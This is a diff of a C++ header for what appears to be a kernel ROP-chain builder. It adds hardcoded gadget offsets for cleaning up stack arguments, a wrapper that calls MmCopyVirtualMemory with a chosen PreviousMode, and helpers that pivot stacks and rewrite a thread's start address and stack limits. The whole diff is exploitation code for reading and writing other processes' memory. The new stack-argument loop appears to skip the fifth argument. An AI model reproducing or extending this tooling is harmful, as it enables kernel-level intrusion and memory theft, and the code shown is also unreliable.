@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 #include <memory>
 #include <vector>
 #include <string_view>
@@ -27,7 +27,6 @@ public:
     void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
     void AddPadding(const std::size_t PaddingSize = 8);
     void ReadIntoRcx(const std::uint64_t ReadAddress);
-    void ReadIntoR8(const std::uint64_t ReadAddress);
     void ReadRaxIntoRax();
     void PivotToR11();
     void MovRaxIntoR9();
@@ -39,6 +38,7 @@ public:
     void SetRaxRcxRdx(const std::uint64_t NewRaxValue, const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue);
     void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
     void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);
+    void CallMmCopyVirtualMemory(void* SourceProcess, void* SourceAddress, void* TargetProcess, void* TargetAddress, int PreviousMode, const std::size_t BufferSize, void* ReturnSize);
     void PivotToNewStack(StackManager& StackToPivot);
     void LoopBack();
     void AlignStack();
@@ -71,10 +71,45 @@ public:
 
         this->AddGadget(FunctionAddress, "Function to call address");
 
-        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
-        this->AddValue(0, "Shadow space 1");
-        this->AddValue(0, "Shadow space 2");
-        this->AddValue(0, "Shadow space 3");
-        this->AddValue(0, "Shadow space 4");
+        switch (ArgCount)
+        {
+        case 0:
+        case 1:
+        case 2:
+        case 3:
+        case 4:
+            this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
+            break;
+        case 5:
+            this->AddGadget(0x2005e3, "add rsp, 0x28; ret;");
+            break;
+        case 6:
+            this->AddGadget(0x200a54, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
+            break;
+        case 7:
+            this->AddGadget(0x20268c, "add rsp, 0x38; ret;");
+            break;
+        case 8:
+            this->AddGadget(0x3dec5c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
+            break;
+        case 9:
+            this->AddGadget(0x216dce, "add rsp, 0x48; ret;");
+            break;
+        case 10:
+            this->AddGadget(0x72f29c, "pop ...; add rsp, 0x48; ret;");
+            break;
+        }
+
+        // Setup shadow stack space
+        this->AddPadding(0x20);
+
+        // Append stack arugments if they exist
+        if constexpr (ArgCount > 4)
+        {
+            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };
+
+            for (std::size_t i = 5; i < ArgCount; i++)
+                this->AddValue(ConvertedArgs[i], "stack arg");
+        }
     }
 };
